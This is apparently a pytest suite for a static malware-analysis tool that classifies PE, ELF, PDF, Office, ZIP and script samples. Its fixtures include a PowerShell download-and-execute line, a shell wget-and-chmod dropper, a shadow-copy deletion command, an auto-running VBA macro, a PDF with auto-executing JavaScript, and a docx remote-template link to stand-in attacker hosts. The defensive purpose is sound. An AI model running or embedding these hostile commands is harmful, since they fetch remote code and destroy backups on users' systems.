"""chimera_static: real PE/ELF fixtures, crafted PDFs/scripts, and the safety rules."""

import json
import os
import stat
import subprocess
import sys
from pathlib import Path

import pytest

from chimera_static.analyze import analyze
from chimera_static.identify import identify
from chimera_static.safety import SampleError, read_sample

HERE = Path(__file__).resolve().parent
PE = HERE / "fixtures" / "test.exe"                   # copy of the repo's test/test.exe, benign test program (PE32+)
ELF = HERE / "fixtures" / "linux-x86_64.so"           # MarkupSafe 3.0.2 manylinux wheel, _speedups.so

BENIGN_PDF = b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n" \
             b"3 0 obj<</Type/Page/Parent 2 0 R>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
EVIL_PDF = b"%PDF-1.7\n1 0 obj<</Type/Catalog/OpenAction 4 0 R/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]" \
           b"/Count 1>>endobj\n3 0 obj<</Type/Page>>endobj\n4 0 obj<</S/J#61vaScript/JS(app.alert(1))>>endobj\n" \
           b"5 0 obj<</Type/EmbeddedFile>>endobj\n6 0 obj<</S/URI/URI(http://evil.example.top/x)>>endobj\n%%EOF\n"


def write(tmp_path, name, data, mode=0o440):
    p = tmp_path / name
    p.write_bytes(data)
    p.chmod(mode)
    return p


def ids(result):
    return {f["id"] for f in result["findings"]}


def test_pe_fixture(tmp_path):
    r = analyze(str(write(tmp_path, "s", PE.read_bytes())), str(tmp_path), file_name="test.exe")
    assert r["type"]["format"] == "pe" and r["type"]["arch"] == "x86_64"
    assert r["pe"]["import_count"] > 0 and r["pe"]["imphash"]
    assert r["ml"]["ember_v3"]["dim"] == 2568
    assert r["level"] in ("clean", "low")
    on_disk = json.loads((tmp_path / "static.json").read_text())
    assert on_disk["file"]["sha256"] == r["file"]["sha256"]


def test_elf_fixture(tmp_path):
    r = analyze(str(write(tmp_path, "s", ELF.read_bytes())), file_name="_speedups.so")
    assert r["type"]["format"] == "elf" and r["type"]["platform"] == "linux" and r["type"]["bits"] == 64
    assert r["elf"]["machine"] == "EM_X86_64" and r["elf"]["type"] == "ET_DYN"
    assert r["elf"]["needed"] and r["elf"]["stripped"] is False
    assert r["ml"]["ember_v3"]["dim"] == 2568
    assert not [e for e in r["errors"] if e["stage"] == "elf"]


def test_pdf_benign_vs_malicious(tmp_path):
    good = analyze(str(write(tmp_path, "a", BENIGN_PDF)), file_name="report.pdf")
    bad = analyze(str(write(tmp_path, "b", EVIL_PDF)), file_name="invoice.pdf")
    assert good["type"]["format"] == "pdf" and good["level"] == "clean"
    assert {"pdf_javascript", "pdf_auto_js", "pdf_embedded_file", "pdf_obfuscated_names"} <= ids(bad)
    assert bad["pdf"]["uris"] == ["http://evil.example.top/x"]
    assert bad["score"] > good["score"] and bad["level"] in ("medium", "high")


def test_disguised_executable(tmp_path):
    r = analyze(str(write(tmp_path, "s", PE.read_bytes())), file_name="invoice.pdf.exe")
    assert "type_double_extension" in ids(r)
    r = analyze(str(write(tmp_path, "t", PE.read_bytes())), file_name="photo.jpg")
    assert "type_extension_mismatch" in ids(r)
    r = analyze(str(write(tmp_path, "u", PE.read_bytes())), file_name="report‮fdp.exe")
    assert "type_rtlo" in ids(r)


def test_executable_hidden_in_document(tmp_path):
    r = analyze(str(write(tmp_path, "s", BENIGN_PDF + b"\n" + PE.read_bytes())), file_name="doc.pdf")
    assert "embedded_executable" in ids(r)


@pytest.mark.parametrize("text,lang", [
    (b"$c = New-Object Net.WebClient\nInvoke-Expression $c.DownloadString('http://x.top/a')\n", "powershell"),
    (b"Dim s\nSet s = CreateObject(\"WScript.Shell\")\ns.Run \"cmd /c calc\"\n", "vbscript"),
    (b"@echo off\nset x=1\nvssadmin delete shadows /all /quiet\n", "batch"),
    (b"#!/bin/sh\nwget http://x.top/b -O /tmp/b\nchmod +x /tmp/b\n", "shell"),
])
def test_scripts_identified(tmp_path, text, lang):
    r = analyze(str(write(tmp_path, "s", text)))
    assert r["type"]["format"] == f"script:{lang}"
    if lang == "batch":
        assert "str_shadow_delete" in ids(r)


def test_strings_iocs(tmp_path):
    data = b"\x00" * 64 + b"http://c2.example.top/gate.php\x00 10.13.37.1 \x00SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\x"
    r = analyze(str(write(tmp_path, "s", data)))
    i = r["universal"]["iocs"]
    assert "http://c2.example.top/gate.php" in i["urls"] and "10.13.37.1" in i["ips"]
    assert "str_run_key" in ids(r)


@pytest.mark.parametrize("data", [b"", b"\x00", os.urandom(4096), b"MZ" + b"\xff" * 200, b"\x7fELF" + b"\x02" * 60,
                                  b"%PDF-" + b"(" * 5000])
def test_garbage_never_crashes(tmp_path, data):
    r = analyze(str(write(tmp_path, "s", data)))
    assert r["schema"] == "chimera-static/1" and 0 <= r["score"] <= 100


def test_refuses_symlink_and_directory(tmp_path):
    target = write(tmp_path, "real", b"abc")
    link = tmp_path / "link"
    link.symlink_to(target)
    with pytest.raises(SampleError):
        read_sample(str(link))
    with pytest.raises(SampleError):
        read_sample(str(tmp_path))


def test_oversized_sample_is_refused_not_truncated(tmp_path):
    # Hashing only the first 256 MiB and reporting it as the file's hash would be wrong; refuse with a reason.
    big = tmp_path / "big"
    with big.open("wb") as fh:
        fh.truncate(256 * 1024 * 1024 + 1)  # sparse, takes no disk space
    with pytest.raises(SampleError, match="over the 268435456 byte"):
        read_sample(str(big))
    data, info = read_sample(str(write(tmp_path, "small", b"abc")))
    assert data == b"abc" and info["size"] == 3 and "truncated" not in info


def test_coverage_marks_what_was_not_analysed(tmp_path):
    script = analyze(str(write(tmp_path, "s.ps1", b"Write-Host 'hello'\n")), ember=False)
    assert script["coverage"]["complete"] is False and script["coverage"]["type_plugin"] is None
    pdf = analyze(str(write(tmp_path, "d.pdf", BENIGN_PDF)), ember=False)
    assert pdf["coverage"]["type_plugin"] == "pdf"
    assert pdf["coverage"]["complete"] is ("pdf" in pdf and not {"identify", "hashes", "strings"}
                                           & set(pdf["coverage"]["failed_stages"]))


def test_never_makes_anything_executable(tmp_path):
    sample = write(tmp_path, "s", PE.read_bytes(), mode=0o440)
    analyze(str(sample), str(tmp_path))
    for p in (sample, tmp_path / "static.json"):
        assert not p.stat().st_mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH), p
    assert stat.S_IMODE((tmp_path / "static.json").stat().st_mode) == 0o640
    assert stat.S_IMODE(sample.stat().st_mode) == 0o440  # the analyzer never changes the sample


def test_cli_exit_codes(tmp_path):
    out = tmp_path / "out"
    out.mkdir()
    ok = subprocess.run([sys.executable, "-I", "-m", "chimera_static", str(write(tmp_path, "s", BENIGN_PDF)), str(out)])
    assert ok.returncode == 0 and json.loads((out / "static.json").read_text())["type"]["format"] == "pdf"
    refused = subprocess.run([sys.executable, "-I", "-m", "chimera_static", str(tmp_path), str(out)],
                             stderr=subprocess.DEVNULL)
    assert refused.returncode == 2 and "error" in json.loads((out / "static.json").read_text())


def test_identify_formats():
    assert identify(b"PK\x03\x04")["format"] == "zip"
    assert identify(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 100)["format"] == "ole"
    assert identify(b"{\\rtf1\\ansi")["format"] == "rtf"
    assert identify(b"\xcf\xfa\xed\xfe\x0c\x00\x00\x01" + b"\x00" * 32)["format"] == "macho"
    assert identify(b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 100)["format"] == "lnk"


def test_ssdeep_matches_the_reference_and_is_fast_on_padding():
    import hashlib
    import time

    from chimera_static.universal import hashes

    data = b"".join(hashlib.sha256(i.to_bytes(4, "little")).digest() for i in range(8192)) + bytes(65536)
    # Reference value from the earlier pure-Python implementation (ppdeep 20200505): same algorithm, same output.
    assert hashes(data)["ssdeep"] == "6144:QLHKI0nmTf57Zq5C7xKxq1npBgWJo0F2ZxD6CSUTXo:u3uCdJUsHaOoI2WGTXo"
    padded = ((os.urandom(4096) + bytes(60000)) * 520)[: 32 * 1024 * 1024]
    started = time.monotonic()
    assert hashes(padded)["ssdeep"]
    assert time.monotonic() - started < 10  # ppdeep needed about 90 s here


def _zip(members, comment=b""):
    import io
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in members:
            z.writestr(name, data)
        z.comment = comment
    return buf.getvalue()


CONTENT_TYPES = (b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                 b'<Default Extension="xml" ContentType="application/xml"/></Types>')


def test_office_macro_indicators_from_vba_source():
    from chimera_static.plugins.office import analyze_office

    vba = (b'Attribute VB_Name = "ThisDocument"\r\nSub AutoOpen()\r\n'
           b'  Set s = CreateObject("WScript.Shell")\r\n  s.Run "powershell -enc AAAA"\r\n'
           b'  Shell "cmd /c http://evil.example.top/a.exe"\r\nEnd Sub\r\n')
    info, findings = analyze_office(vba, "ole")
    got = {f["id"]: f for f in findings}
    assert info["macros"] and "AutoOpen" in info["autoexec"]
    assert {"office_macros", "office_autoexec", "office_suspicious_vba"} <= set(got)
    assert got["office_suspicious_vba"]["severity"] == "high"


def test_ooxml_remote_template_and_clean_document(tmp_path):
    rels = (b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
            b'attachedTemplate" Target="http://evil.example.top/t.dotm" TargetMode="External"/></Relationships>')
    docx = _zip([("[Content_Types].xml", CONTENT_TYPES), ("word/document.xml", b"<w:document/>"),
                 ("word/_rels/settings.xml.rels", rels)])
    r = analyze(str(write(tmp_path, "invoice.docx", docx)), timeout_s=60, ember=False)
    assert r["type"]["format"] == "ooxml"
    assert "office_remote_template" in ids(r) and r["ooxml"]["macros"] is False
    clean = _zip([("[Content_Types].xml", CONTENT_TYPES), ("word/document.xml", b"<w:document/>")])
    r = analyze(str(write(tmp_path, "notes.docx", clean)), timeout_s=60, ember=False)
    assert not {i for i in ids(r) if i.startswith("office_")}
    assert r["coverage"]["complete"] is True and r["coverage"]["type_plugin"] == "ooxml"


def test_zip_listing_flags_risky_members_and_is_never_complete(tmp_path):
    data = _zip([("docs/readme.txt", b"hello"), ("invoice.pdf.exe", b"MZ" + bytes(100)),
                 ("run.vbs", b"WScript.Echo 1"), ("../evil.dll", b"MZ"), ("inner.zip", b"PK")])
    r = analyze(str(write(tmp_path, "parcel.zip", data)), timeout_s=60, ember=False)
    assert r["type"]["format"] == "zip"
    assert {"zip_executable", "zip_script", "zip_double_extension", "zip_nested", "zip_path_traversal"} <= ids(r)
    assert r["zip"]["members"] == 5 and len(r["zip"]["listed"]) == 5
    assert r["coverage"]["complete"] is False and "archive-contents" in r["coverage"]["failed_stages"]
    quiet = _zip([("a.txt", b"x"), ("b.txt", b"y")])
    r = analyze(str(write(tmp_path, "texts.zip", quiet)), timeout_s=60, ember=False)
    assert not {i for i in ids(r) if i.startswith("zip_")} and r["coverage"]["complete"] is False


def test_zip_bomb_ratio_is_reported_without_decompressing(tmp_path):
    data = _zip([("big.bin", bytes(80 * 1024 * 1024))])
    r = analyze(str(write(tmp_path, "bomb.zip", data)), timeout_s=60, ember=False)
    assert "zip_bomb" in ids(r) and r["zip"]["compression_ratio"] > 100
